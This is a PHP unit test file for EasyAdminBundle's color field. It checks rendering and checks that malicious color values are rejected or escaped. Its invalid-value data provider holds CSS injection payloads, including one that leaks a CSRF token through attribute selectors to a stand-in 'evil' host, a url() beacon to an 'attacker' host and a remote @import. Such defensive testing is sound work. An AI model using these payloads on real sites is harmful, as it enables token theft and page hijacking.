<?php

namespace EasyCorp\Bundle\EasyAdminBundle\Tests\Unit\Field;

use EasyCorp\Bundle\EasyAdminBundle\Context\AdminContext;
use EasyCorp\Bundle\EasyAdminBundle\Contracts\Field\FieldConfiguratorInterface;
use EasyCorp\Bundle\EasyAdminBundle\Dto\EntityDto;
use EasyCorp\Bundle\EasyAdminBundle\Dto\FieldDto;
use EasyCorp\Bundle\EasyAdminBundle\Field\ColorField;
use EasyCorp\Bundle\EasyAdminBundle\Field\Configurator\ColorConfigurator;
use Symfony\Component\Form\Extension\Core\Type\ColorType;

class ColorFieldTest extends AbstractFieldTest
{
    protected function setUp(): void
    {
        parent::setUp();

        // wraps ColorConfigurator with the formattedValue propagation that
        // CommonPreConfigurator performs in the real configurator chain.
        $colorConfigurator = new ColorConfigurator();
        $this->configurator = new class($colorConfigurator) implements FieldConfiguratorInterface {
            public function __construct(private readonly ColorConfigurator $inner)
            {
            }

            public function supports(FieldDto $field, EntityDto $entityDto): bool
            {
                return ColorField::class === $field->getFieldFqcn();
            }

            public function configure(FieldDto $field, EntityDto $entityDto, AdminContext $context): void
            {
                if (null === $field->getFormattedValue()) {
                    $field->setFormattedValue($field->getValue());
                }

                $this->inner->configure($field, $entityDto, $context);
            }
        };
    }

    public function testDefaultOptions(): void
    {
        $field = ColorField::new('color');
        $fieldDto = $this->configure($field);

        self::assertTrue($fieldDto->getCustomOption(ColorField::OPTION_SHOW_SAMPLE));
        self::assertFalse($fieldDto->getCustomOption(ColorField::OPTION_SHOW_VALUE));
        self::assertSame(ColorType::class, $fieldDto->getFormType());
        self::assertStringContainsString('field-color', $fieldDto->getCssClass());
        self::assertSame('crud/field/color', $fieldDto->getTemplateName());
    }

    public function testFieldWithValue(): void
    {
        $field = ColorField::new('color');
        $field->setValue('#ff5733');
        $fieldDto = $this->configure($field);

        self::assertSame('#ff5733', $fieldDto->getValue());
    }

    public function testFieldWithNullValue(): void
    {
        $field = ColorField::new('color');
        $field->setValue(null);
        $fieldDto = $this->configure($field);

        self::assertNull($fieldDto->getValue());
    }

    public function testShowSample(): void
    {
        $field = ColorField::new('color');
        $field->showSample();
        $fieldDto = $this->configure($field);

        self::assertTrue($fieldDto->getCustomOption(ColorField::OPTION_SHOW_SAMPLE));
    }

    public function testHideSample(): void
    {
        $field = ColorField::new('color');
        $field->showSample(false);
        $fieldDto = $this->configure($field);

        self::assertFalse($fieldDto->getCustomOption(ColorField::OPTION_SHOW_SAMPLE));
    }

    public function testShowValue(): void
    {
        $field = ColorField::new('color');
        $field->showValue();
        $fieldDto = $this->configure($field);

        self::assertTrue($fieldDto->getCustomOption(ColorField::OPTION_SHOW_VALUE));
    }

    public function testHideValue(): void
    {
        $field = ColorField::new('color');
        $field->showValue(false);
        $fieldDto = $this->configure($field);

        self::assertFalse($fieldDto->getCustomOption(ColorField::OPTION_SHOW_VALUE));
    }

    public function testShowBothSampleAndValue(): void
    {
        $field = ColorField::new('color');
        $field->showSample();
        $field->showValue();
        $fieldDto = $this->configure($field);

        self::assertTrue($fieldDto->getCustomOption(ColorField::OPTION_SHOW_SAMPLE));
        self::assertTrue($fieldDto->getCustomOption(ColorField::OPTION_SHOW_VALUE));
    }

    public function testTemplateShowsSampleWhenEnabled(): void
    {
        $field = ColorField::new('color');
        $field->setValue('#ff5733');
        $field->showSample();
        $field->showValue(false);
        $fieldDto = $this->configure($field);

        $html = $this->renderFieldTemplate($fieldDto, $this->entityDto, $this->adminContext);

        self::assertStringContainsString('class="color-sample"', $html);
        // the `#` is HTML-entity-encoded by |e('html_attr'); browsers decode it back in the style attribute
        self::assertStringContainsString('style="background: &#x23;ff5733', $html);
        // the color value should only appear in attributes, not as text content after the span
        self::assertDoesNotMatchRegularExpression('/<\/span>\s*#ff5733/', $html);
    }

    public function testTemplateHidesSampleWhenDisabled(): void
    {
        $field = ColorField::new('color');
        $field->setValue('#ff5733');
        $field->showSample(false);
        $field->showValue();
        $fieldDto = $this->configure($field);

        $html = $this->renderFieldTemplate($fieldDto, $this->entityDto, $this->adminContext);

        self::assertStringNotContainsString('class="color-sample"', $html);
        // the color value should appear as text content (not just in attributes)
        self::assertMatchesRegularExpression('/^\s*#ff5733\s*$/', $html);
    }

    public function testTemplateShowsValueWhenEnabled(): void
    {
        $field = ColorField::new('color');
        $field->setValue('#00ff00');
        $field->showSample(false);
        $field->showValue();
        $fieldDto = $this->configure($field);

        $html = $this->renderFieldTemplate($fieldDto, $this->entityDto, $this->adminContext);

        // the color value should appear as text content (not just in attributes)
        self::assertMatchesRegularExpression('/^\s*#00ff00\s*$/', $html);
    }

    public function testTemplateShowsBothSampleAndValue(): void
    {
        $field = ColorField::new('color');
        $field->setValue('#0000ff');
        $field->showSample();
        $field->showValue();
        $fieldDto = $this->configure($field);

        $html = $this->renderFieldTemplate($fieldDto, $this->entityDto, $this->adminContext);

        self::assertStringContainsString('class="color-sample"', $html);
        // the `#` is HTML-entity-encoded by |e('html_attr'); browsers decode it back in the style attribute
        self::assertStringContainsString('background: &#x23;0000ff', $html);
        // the value should appear as text content after the sample span
        self::assertMatchesRegularExpression('/<\/span>\s*#0000ff\s*$/', $html);
    }

    /**
     * @dataProvider provideInvalidColorValues
     */
    public function testMaliciousValueIsNulled(string $malicious): void
    {
        $field = ColorField::new('color');
        $field->setValue($malicious);
        $fieldDto = $this->configure($field);

        self::assertNull($fieldDto->getValue());
        self::assertNull($fieldDto->getFormattedValue());
    }

    public static function provideInvalidColorValues(): iterable
    {
        yield 'CSS injection via declaration break' => ['red; background-image: url(//attacker/log?c='];
        yield 'full-screen overlay payload' => ['red; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999'];
        yield 'attribute selector exfiltration' => ['red; } input[name="_csrf_token"][value^="a"] ~ .color-sample { background: url(//evil/a); } .x {'];
        yield 'external stylesheet import' => ['@import url("//evil/sheet.css")'];
        yield 'css color name' => ['red'];
        yield 'rgb function' => ['rgb(255, 0, 0)'];
        yield 'rgba function' => ['rgba(255, 0, 0, 0.5)'];
        yield 'hsl function' => ['hsl(0, 100%, 50%)'];
        yield 'missing hash prefix' => ['ff5733'];
        yield 'hex with trailing garbage' => ['#ff5733;'];
        yield 'hex with whitespace' => ['#ff5733 '];
    }

    /**
     * @dataProvider provideValidColorValues
     */
    public function testValidHexValueIsPreserved(string $valid): void
    {
        $field = ColorField::new('color');
        $field->setValue($valid);
        $fieldDto = $this->configure($field);

        self::assertSame($valid, $fieldDto->getValue());
    }

    public static function provideValidColorValues(): iterable
    {
        yield 'short hex' => ['#fff'];
        yield 'short hex uppercase' => ['#F0A'];
        yield 'standard rrggbb' => ['#ff5733'];
        yield 'standard rrggbb uppercase' => ['#FF5733'];
        yield 'rrggbbaa with alpha' => ['#ff5733cc'];
    }

    public function testTemplateEscapesValueInStyleAttribute(): void
    {
        // Simulate a bypass of the configurator (e.g. a subclass overriding it):
        // the template-side |e('html_attr') filter must still break CSS injection.
        $field = ColorField::new('color');
        $field->showSample();
        $fieldDto = $this->configure($field);
        $fieldDto->setValue('red; background-image: url(//evil)');

        $html = $this->renderFieldTemplate($fieldDto, $this->entityDto, $this->adminContext);

        self::assertStringNotContainsString('; background-image: url(//evil)', $html);
        self::assertStringNotContainsString('url(//evil)', $html);
    }

    public function testTemplateShowsNothingWhenBothDisabled(): void
    {
        $field = ColorField::new('color');
        $field->setValue('#ffffff');
        $field->showSample(false);
        $field->showValue(false);
        $fieldDto = $this->configure($field);

        $html = $this->renderFieldTemplate($fieldDto, $this->entityDto, $this->adminContext);

        self::assertStringNotContainsString('color-sample', $html);
        self::assertStringNotContainsString('#ffffff', $html);
    }
}
